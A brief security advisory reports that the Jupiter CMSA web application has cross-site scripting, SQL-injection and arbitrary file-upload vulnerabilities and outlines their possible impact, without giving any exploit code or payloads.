Jupiter CMSA is prone to multiple input-validation vulnerabilities, including cross-site scripting, SQL-injection, and arbitrary file-upload issues, because the application fails to sanitize user-supplied input.

A successful exploit of these vulnerabilities could allow an attacker to compromise the application, access or modify data, steal cookie-based authentication credentials, exploit vulnerabilities in the underlying database implementation, or upload and execute arbitrary files within the webserver process. Other attacks are also possible.
